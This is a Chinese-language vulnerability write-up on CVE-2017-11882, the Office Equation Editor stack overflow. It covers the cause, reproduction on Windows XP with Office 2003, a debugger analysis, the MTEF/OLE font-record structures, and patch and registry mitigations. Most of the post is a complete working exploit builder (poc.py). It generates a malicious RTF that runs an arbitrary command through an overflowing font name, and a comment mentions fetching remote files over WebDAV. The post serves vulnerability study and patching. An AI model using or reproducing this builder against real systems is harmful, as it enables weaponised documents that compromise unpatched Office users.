---
title: "CVE-2017-11882漏洞分析"
date: 2021-05-11T15:07:34+08:00
tags: ["CVE", "二进制"]
ShowToc: true
TocOpen: true
draft: false
---

## 漏洞描述

- **成因**：Office的公式编辑器`EQNEDT32.EXE`读入包含MathType的OLE数据，在拷贝公式字体名称前没有对名称长度进行校验，当`EQNEDT32.EXE`尝试将字体名称复制到本地创建的缓冲区时，攻击者可以通过刻意构造的数据内容覆盖栈上的函数返回地址，从而劫持程序流程。
- **影响版本**：**Office 2003到2016的所有版本**
- **POC**：https://github.com/Ridter/CVE-2017-11882

## 漏洞复现

- **环境** 

  Microsoft Windows XPProfessional版本2002 Service Fack 3 

  Office2003SP3

**复现过程**

下载poc，输出test.doc，将test.doc复制到相应环境下，双击打开即可。

![image-20210529171608403](https://www.kro1lsec.com:442/images/2021/05/29/20210529204339.png)

![image-20210529171901313](https://www.kro1lsec.com:442/images/2021/05/29/20210529204342.png)



## 漏洞分析

- **环境** Winxp x32 Office2003
- **工具** windbg IDA Pro

漏洞发生点如下图所示：

![image-20210529162104706](https://www.kro1lsec.com:442/images/2021/05/29/20210529204346.png)

![image-20210529150238725](https://www.kro1lsec.com:442/images/2021/05/29/20210529204412.png)

可以看到，函数给SrcStr变量分配的大小是0x24个字节，长度超过该大小就会造成栈溢出。微软后续的补丁将大小限制为0x20可能是为了安全起见。

![image-20210529150440804](https://www.kro1lsec.com:442/images/2021/05/29/20210529204349.png)

触发逻辑

![image-20210529151004212](https://www.kro1lsec.com:442/images/2021/05/29/20210529204405.png)

## 构造POC

由于该漏洞涉及到MathType公式数据在OLE中的结构，所以我们需要熟悉其结构分布。整个“Equation Native”的数据构成为：

Equation Native Stream Data = EQNOLEFILEHDR + MTEFData，其中

MTEFData = MTEF header + MTEF Byte Stream

EQNOLEFILEHDR 头的结构

```
struct EQNOLEFILEHDR {
  WORD    cCBHdr;     // 格式头长度,大小为0x1C
  DWORD   nVersion;   // 固定为0×00020000。
  WORD    nCf;        // 该公式对象的剪贴板格式
  DWORD   cbObject;   // MTEF数据的长度，不包括头部
  DWORD   nReserved1; // 未使用
  DWORD   nReserved2; // 未使用
  DWORD   nReserved3; // 未使用
  DWORD   nReserved4; // 未使用
};
```

MTEF header 的结构，里面存放一些版本信息

| **Description**     | **Size (byte)** | **Value** | **Comment**     |
| ------------------- | --------------- | --------- | --------------- |
| MTEF Version        | 1               | 0x3       | MTEFv3          |
| Generating Platform | 1               | 0x1       | Windows         |
| Generating Product  | 1               | 0x1       | Equation Editor |
| Product Version     | 1               | 0x3       |                 |
| Product Subversion  | 1               | 0xa       |                 |

**MTEFByte Stream**

| **value** |                          **symbol**                          |                      **description**                      |
| :-------: | :----------------------------------------------------------: | :-------------------------------------------------------: |
|     0     | [END](http://rtf2latex2e.sourceforge.net/MTEF3.html#END_record) | end of MTEF, pile, line, embellishment  list, or template |
|     1     | [LINE](http://rtf2latex2e.sourceforge.net/MTEF3.html#LINE_record) |                    line (slot) record                     |
|     2     | [CHAR](http://rtf2latex2e.sourceforge.net/MTEF3.html#CHAR_record) |                     character record                      |
|     3     | [TMPL](http://rtf2latex2e.sourceforge.net/MTEF3.html#TMPL_record) |                      template record                      |
|     4     | [PILE](http://rtf2latex2e.sourceforge.net/MTEF3.html#PILE_record) |           pile (vertical stack of lines) record           |
|     5     | [MATRIX](http://rtf2latex2e.sourceforge.net/MTEF3.html#MATRIX_record) |                       matrix record                       |
|     6     | [EMBELL](http://rtf2latex2e.sourceforge.net/MTEF3.html#EMBELL_record) |     character embellishment (e.g. hat, prime)  record     |
|     7     | [RULER](http://rtf2latex2e.sourceforge.net/MTEF3.html#RULER_record) |             ruler (tab-stop location) record              |
|     8     | [FONT](http://rtf2latex2e.sourceforge.net/MTEF3.html#FONT_record) |                     font name record                      |
|     9     | [SIZE](http://rtf2latex2e.sourceforge.net/MTEF3.html#SIZE_record) |                    general size record                    |
|    10     | [FULL](http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records) |                     full size record                      |
|    11     | [SUB](http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records) |                   subscript size record                   |
|    12     | [SUB2](http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records) |                 sub-subscript size record                 |
|    13     | [SYM](http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records) |                    symbol size record                     |
|    14     | [SUBSYM](http://rtf2latex2e.sourceforge.net/MTEF3.html#TYPESIZE_records) |                  sub-symbol size record                   |

我们主要关注的是其中的 FONT 结构，也就是漏洞点，结构如下

| **Description** | **Size (byte)**           | **Value**                                                   | **Comment**                           |
| --------------- | ------------------------- | ----------------------------------------------------------- | ------------------------------------- |
| Tag             | 1                         | 0x8                                                         | 0x8 denotes Font record               |
| Typeface Number | 1                         | 0x5a                                                        |                                       |
| Style           | 1                         | 0x5a                                                        |                                       |
| Font Name       | Variable, NULL terminated | “cmd.exe /c calc.exe AAAAAAAAAAAAAAAAAAAAAAAA” + 0x00430c12 | Overflow and overwrite return address |

大致是这样子

```
struct stuFontRecord {
　　BYTE bTag;        // 字体文件的tag位0×08
　　BYTE bTypeFace;   // 字体风格0x5a
　　BYTE bStyle;      // 字体样式0x5a
　　BYTE bFontName[n] // 字体名称,以NULL为结束符,漏洞点
};
```

Font record = tag(固定为8，占一个字节) + typeface(占一个字节) + style(占一个字节) + font_name(以0x00结尾的字符串)

```python
#poc.py关键注释
#文件头 包含字符集 支持字符 缺省字体 字体表 生成器
{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
#版本信息
{\*\generator Riched20 6.3.9600}
#正常视图 单字节
\viewkind4\uc1
#段落文本属性
\pard\sa200\sl276\slmult1
# 字体 大小 
\f0\fs22\lang9 
#控制字 自动更新ole对象
{\object\objemb\objupdate
#公式对象
{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 
                                                        
```

```python
#poc.py完整
import argparse
import sys


RTF_HEADER = R"""{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\*\generator Riched20 6.3.9600}\viewkind4\uc1
\pard\sa200\sl276\slmult1\f0\fs22\lang9"""


RTF_TRAILER = R"""\par}
"""


OBJECT_HEADER = R"""{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata """

#对象区\resul结果对象控制字，结果目标包含了该对像的最后更新结果。这样//允许那些不能识别对象或者不能使用该特定类型对象的旧的RTF阅读器使用当//前的对象值来替换该对象，从而保持其外观显示。
OBJECT_TRAILER = R"""
}{\result {\rtlch\fcs1 \af0 \ltrch\fcs0 \dn8\insrsid95542\charrsid95542 {\pict{\*\picprop\shplid1025{\sp{\sn shapeType}{\sv 75}}{\sp{\sn fFlipH}{\sv 0}}
{\sp{\sn fFlipV}{\sv 0}}{\sp{\sn fLockAspectRatio}{\sv 1}}{\sp{\sn pictureGray}{\sv 0}}{\sp{\sn pictureBiLevel}{\sv 0}}{\sp{\sn fRecolorFillAsPicture}{\sv 0}}{\sp{\sn fUseShapeAnchor}{\sv 0}}{\sp{\sn fFilled}{\sv 0}}{\sp{\sn fHitTestFill}{\sv 1}}
{\sp{\sn fillShape}{\sv 1}}{\sp{\sn fillUseRect}{\sv 0}}{\sp{\sn fNoFillHitTest}{\sv 0}}{\sp{\sn fLine}{\sv 0}}{\sp{\sn fPreferRelativeResize}{\sv 1}}{\sp{\sn fReallyHidden}{\sv 0}}
{\sp{\sn fScriptAnchor}{\sv 0}}{\sp{\sn fFakeMaster}{\sv 0}}{\sp{\sn fCameFromImgDummy}{\sv 0}}{\sp{\sn fLayoutInCell}{\sv 1}}}\picscalex100\picscaley100\piccropl0\piccropr0\piccropt0\piccropb0
\picw353\pich600\picwgoal200\pichgoal340\wmetafile8\bliptag1846300541\blipupi2307{\*\blipuid 6e0c4f7df03da08a8c6c623556e3c652}0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02
00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000}}}}
"""

#Equation Native数据流
OBJDATA_TEMPLATE = R"""
01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1
b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001
0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe
fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000
000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000
0000000000000000000000000000000000000000000000000000001400000000000000010043006f
006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000
00000000000000000000000000000000000000000000000000000000000000010000006600000000
00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000003
0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffff01000002080000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02
ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e
30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000
00000000000000000000000000000000000000000000000000000000000000000000000000030004
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4
ee5b0000000000030101030a0a01085a5a4141414141414141414141414141414141414141414141
414141414141414141414141414141414141414141120c4300000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000004500710075
006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000
0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000
0000000000000000000000000000000000000000000000000000000000000004000000c500000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff
ffffff00000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000000000ff
ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000001050000050000000d0000004d
45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500
000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00
050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00
ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468
54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65
7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001
90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131
0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131
31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000
0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff
7cef1800040000002d01010004000000f0010000030000000000
"""

COMMAND_OFFSET = 0x949*2

def create_ole_exec_primitive(command):
    if len(command) > 43:
        print "[!] Primitive command must be shorter than 43 bytes"
        sys.exit(0)
    hex_command = command.encode("hex")
    objdata_hex_stream = OBJDATA_TEMPLATE.translate(None, "\r\n")
    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]
    return OBJECT_HEADER + ole_data + OBJECT_TRAILER

def create_rtf(header,command,trailer):
    ole1 = create_ole_exec_primitive(command + " &")
    
    # We need 2 or more commands for executing remote file from WebDAV
    # because WebClient service start may take some time
    return header + ole1 + trailer

def getrheader(file):
    input_file = open(file,"r").read()
    r_header = input_file.split("{\*\datastore")[0]
    return r_header

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="PoC for CVE-2017-11882")
    parser.add_argument("-c", "--command", help="Command to execute.", required=True)
    parser.add_argument('-o', "--output", help="Output exploit rtf", required=True)
    parser.add_argument("-i", "--input", help="Input normal rtf.", required=False)

    args = parser.parse_args()
    if args.input != None:
        r_header = getrheader(args.input)
    else:
        r_header = RTF_HEADER

    rtf_content = create_rtf(r_header, args.command ,RTF_TRAILER)
    
    output_file = open(args.output, "w")
    output_file.write(rtf_content)

    print "[*] Done ! output file --> " + args.output 
```

## 漏洞修复

开发者：在strcpy（）函数之前，校验待拷贝长度是否在合法区间内阻止溢出即可。

用户只需：

1. 下载补丁：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882
2. 将windows更新到最新版本
3. 在注册表中取消该模块的注册，打开cmd.exe，输入以下两条命令：

```
reg add “HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility Flags” /t REG_DWORD /d 0x400
reg add “HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility Flags” /t REG_DWORD /d 0x400
```



## 参考链接

https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2010/a329t4ed(v=vs.100)?redirectedfrom=MSDN

https://www.freebuf.com/column/183551.html

https://xz.aliyun.com/t/6668

https://www.anquanke.com/member/117972

https://blog.csdn.net/qq_38474570/article/details/98513146

https://bbs.pediy.com/thread-258371.htm

http://rtf2latex2e.sourceforge.net/MTEF3.html

